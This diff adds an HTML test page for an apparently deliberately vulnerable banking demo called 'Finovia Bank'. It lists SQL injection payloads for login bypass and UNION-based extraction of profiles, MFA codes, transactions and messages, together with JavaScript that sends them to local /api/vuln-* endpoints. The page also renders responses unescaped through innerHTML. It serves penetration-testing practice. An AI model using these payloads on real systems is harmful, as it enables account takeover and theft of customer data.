@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SQL Injection Test - Finovia Bank</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 1200px; margin: 50px auto; padding: 20px; background: #f8f9fa; }
+        h1 { color: #dc3545; }
+        .test-box { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .section { border-top: 3px solid #007bff; padding-top: 20px; margin-top: 30px; }
+        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+        button:hover { background: #0056b3; }
+        button.danger { background: #dc3545; }
+        button.danger:hover { background: #c82333; }
+        pre { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
+        .result { margin-top: 20px; padding: 15px; border-radius: 4px; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
+        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #f8f9fa; }
+    </style>
+</head>
+<body>
+    <h1>🔓 SQL Injection Test Suite - Finovia Bank</h1>
+    <p><strong>⚠️ WARNING:</strong> This is a vulnerable application for penetration testing only!</p>
+
+    <!-- LOGIN TESTS -->
+    <div class="section">
+        <h2>🔐 1. Login Endpoint (profiles table)</h2>
+        <div class="test-box">
+            <h3>Test 1.1: Classic SQL Injection - Bypass Authentication</h3>
+            <p><strong>Payload:</strong> <code>' OR '1'='1</code></p>
+            <p>Bypasses authentication by making the WHERE clause always true.</p>
+            <button onclick="testLoginSQLi1()">Test SQL Injection</button>
+            <div id="login-result1"></div>
+        </div>
+
+        <div class="test-box">
+            <h3>Test 1.2: SQL Injection with Comment</h3>
+            <p><strong>Payload:</strong> <code>admin@finovia.com' --</code></p>
+            <p>Comments out the password check.</p>
+            <button onclick="testLoginSQLi2()">Test SQL Injection</button>
+            <div id="login-result2"></div>
+        </div>
+    </div>
+
+    <!-- PROFILES TABLE TESTS -->
+    <div class="section">
+        <h2>👥 2. Profiles Table SQL Injection</h2>
+        <div class="test-box">
+            <h3>Test 2.1: Extract All Profiles</h3>
+            <p><strong>Payload:</strong> <code>' OR '1'='1</code></p>
+            <p>URL: <code>/api/vuln-profiles?account_number=' OR '1'='1</code></p>
+            <button onclick="testProfilesSQLi1()">Test SQL Injection</button>
+            <div id="profiles-result1"></div>
+        </div>
+
+        <div class="test-box">
+            <h3>Test 2.2: Union-Based Injection</h3>
+            <p><strong>Payload:</strong> <code>' UNION SELECT id, full_name, account_number, balance, email, phone, mfa_enabled, mfa_code FROM profiles --</code></p>
+            <button onclick="testProfilesSQLi2()">Test SQL Injection</button>
+            <div id="profiles-result2"></div>
+        </div>
+    </div>
+
+    <!-- TRANSACTIONS TABLE TESTS -->
+    <div class="section">
+        <h2>💰 3. Transactions Table SQL Injection</h2>
+        <div class="test-box">
+            <h3>Test 3.1: Extract All Transactions</h3>
+            <p><strong>Payload:</strong> <code>' OR '1'='1</code></p>
+            <p>URL: <code>/api/vuln-transactions?account_number=' OR '1'='1</code></p>
+            <button onclick="testTransactionsSQLi1()">Test SQL Injection</button>
+            <div id="transactions-result1"></div>
+        </div>
+
+        <div class="test-box">
+            <h3>Test 3.2: Union-Based to Extract Sensitive Data</h3>
+            <p><strong>Payload:</strong> <code>' UNION SELECT id, from_user_id, to_user_id, from_account_number, to_account_number, amount, transaction_type, status, description, created_at FROM transactions --</code></p>
+            <button onclick="testTransactionsSQLi2()">Test SQL Injection</button>
+            <div id="transactions-result2"></div>
+        </div>
+    </div>
+
+    <!-- CONTACT MESSAGES TABLE TESTS -->
+    <div class="section">
+        <h2>📧 4. Contact Messages Table SQL Injection</h2>
+        <div class="test-box">
+            <h3>Test 4.1: Extract All Contact Messages</h3>
+            <p><strong>Payload:</strong> <code>' OR '1'='1</code></p>
+            <p>URL: <code>/api/vuln-contact-messages?email=' OR '1'='1</code></p>
+            <button onclick="testContactSQLi1()">Test SQL Injection</button>
+            <div id="contact-result1"></div>
+        </div>
+
+        <div class="test-box">
+            <h3>Test 4.2: Extract Messages with UNION</h3>
+            <p><strong>Payload:</strong> <code>' UNION SELECT id, user_id, name, email, subject, message, created_at FROM contact_messages --</code></p>
+            <button onclick="testContactSQLi2()">Test SQL Injection</button>
+            <div id="contact-result2"></div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'http://localhost:8080';
+
+        // LOGIN TESTS
+        async function testLoginSQLi1() {
+            const result = await fetch(`${API_BASE}/api/vuln-login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: "admin@finovia.com",
+                    password: "' OR '1'='1"
+                })
+            });
+            const data = await result.json();
+            displayResult('login-result1', data, 'Login SQL Injection #1');
+        }
+
+        async function testLoginSQLi2() {
+            const result = await fetch(`${API_BASE}/api/vuln-login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: "admin@finovia.com' --",
+                    password: "anything"
+                })
+            });
+            const data = await result.json();
+            displayResult('login-result2', data, 'Login SQL Injection #2');
+        }
+
+        // PROFILES TESTS
+        async function testProfilesSQLi1() {
+            const result = await fetch(`${API_BASE}/api/vuln-profiles?account_number=' OR '1'='1`);
+            const data = await result.json();
+            displayTableResult('profiles-result1', data, 'Profiles SQL Injection #1');
+        }
+
+        async function testProfilesSQLi2() {
+            const result = await fetch(`${API_BASE}/api/vuln-profiles?account_number=' UNION SELECT id, full_name, account_number, balance, email, phone, mfa_enabled, mfa_code FROM profiles --`);
+            const data = await result.json();
+            displayTableResult('profiles-result2', data, 'Profiles SQL Injection #2');
+        }
+
+        // TRANSACTIONS TESTS
+        async function testTransactionsSQLi1() {
+            const result = await fetch(`${API_BASE}/api/vuln-transactions?account_number=' OR '1'='1`);
+            const data = await result.json();
+            displayTableResult('transactions-result1', data, 'Transactions SQL Injection #1');
+        }
+
+        async function testTransactionsSQLi2() {
+            const result = await fetch(`${API_BASE}/api/vuln-transactions?account_number=' UNION SELECT id, from_user_id, to_user_id, from_account_number, to_account_number, amount, transaction_type, status, description, created_at FROM transactions --`);
+            const data = await result.json();
+            displayTableResult('transactions-result2', data, 'Transactions SQL Injection #2');
+        }
+
+        // CONTACT MESSAGES TESTS
+        async function testContactSQLi1() {
+            const result = await fetch(`${API_BASE}/api/vuln-contact-messages?email=' OR '1'='1`);
+            const data = await result.json();
+            displayTableResult('contact-result1', data, 'Contact Messages SQL Injection #1');
+        }
+
+        async function testContactSQLi2() {
+            const result = await fetch(`${API_BASE}/api/vuln-contact-messages?email=' UNION SELECT id, user_id, name, email, subject, message, created_at FROM contact_messages --`);
+            const data = await result.json();
+            displayTableResult('contact-result2', data, 'Contact Messages SQL Injection #2');
+        }
+
+        function displayResult(elementId, data, title) {
+            const element = document.getElementById(elementId);
+            const cssClass = data.sqlInjectionDetected ? 'warning' : (data.success ? 'success' : 'error');
+            let html = `<div class="result ${cssClass}">`;
+            html += `<h3>${title} - Result:</h3>`;
+            html += `<p><strong>SQL Injection Detected:</strong> ${data.sqlInjectionDetected ? '✅ YES' : '❌ NO'}</p>`;
+            if (data.warning) html += `<p><strong>⚠️ Warning:</strong> ${data.warning}</p>`;
+            html += `<p><strong>SQL Query:</strong></p><pre>${data.query}</pre>`;
+            if (data.user) {
+                html += `<p><strong>User Data:</strong></p><pre>${JSON.stringify(data.user, null, 2)}</pre>`;
+            }
+            if (data.allUsers) {
+                html += `<p><strong>All Users Exposed:</strong></p><pre>${JSON.stringify(data.allUsers, null, 2)}</pre>`;
+            }
+            html += `</div>`;
+            element.innerHTML = html;
+        }
+
+        function displayTableResult(elementId, data, title) {
+            const element = document.getElementById(elementId);
+            const cssClass = data.sqlInjectionDetected ? 'warning' : 'success';
+            let html = `<div class="result ${cssClass}">`;
+            html += `<h3>${title} - Result:</h3>`;
+            html += `<p><strong>SQL Injection Detected:</strong> ${data.sqlInjectionDetected ? '✅ YES' : '❌ NO'}</p>`;
+            html += `<p><strong>Records Found:</strong> ${data.count}</p>`;
+            if (data.warning) html += `<p><strong>⚠️ Warning:</strong> ${data.warning}</p>`;
+            html += `<p><strong>SQL Query:</strong></p><pre>${data.query}</pre>`;
+            
+            if (data.results && data.results.length > 0) {
+                html += `<h4>Results:</h4>`;
+                html += `<table><thead><tr>`;
+                Object.keys(data.results[0]).forEach(key => {
+                    html += `<th>${key}</th>`;
+                });
+                html += `</tr></thead><tbody>`;
+                data.results.forEach(row => {
+                    html += `<tr>`;
+                    Object.values(row).forEach(val => {
+                        html += `<td>${val !== null && val !== undefined ? val : 'null'}</td>`;
+                    });
+                    html += `</tr>`;
+                });
+                html += `</tbody></table>`;
+            }
+            
+            if (data.totalAmount) {
+                html += `<p><strong>Total Amount:</strong> $${data.totalAmount.toFixed(2)}</p>`;
+            }
+            
+            html += `</div>`;
+            element.innerHTML = html;
+        }
+    </script>
+</body>
+</html>
